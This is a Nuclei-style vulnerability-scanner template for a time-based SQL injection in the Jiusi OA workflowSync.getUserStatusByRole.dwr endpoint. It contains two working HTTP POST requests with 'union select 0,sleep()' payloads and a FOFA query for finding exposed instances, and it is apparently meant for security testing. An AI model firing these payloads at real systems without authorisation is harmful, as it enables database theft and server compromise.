http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
          Content-Type: application/x-www-form-urlencoded; charset=utf-8

          callCount=1
          c0-scriptName=workflowSync
          c0-methodName=getUserStatusByRole
          c0-id=1
          c0-param0=string:1
          c0-param1=string:1 union select 0,sleep(4)#
          xml=true
        - |
          POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
          Content-Type: application/x-www-form-urlencoded; charset=utf-8

          callCount=1
          c0-scriptName=workflowSync
          c0-methodName=getUserStatusByRole
          c0-id=1
          c0-param0=string:1
          c0-param1=string:1 union select 0,sleep(8)#
          xml=true
id: jiusiOA-workflowSync_getUserStatusByRole_dwr-sql
info:
    author: Superhero
    description: |-
        fofa: app="九思软件-OA"
        北京九思协同办公软件 /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 九思OA workflowSync.getUserStatusByRole.dwr SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/PAFrcKJcMHUso463jQR0mw?token=1015546094&lang=zh_CN
    severity: high
    tags:
        - Ioa
        - 九思OA
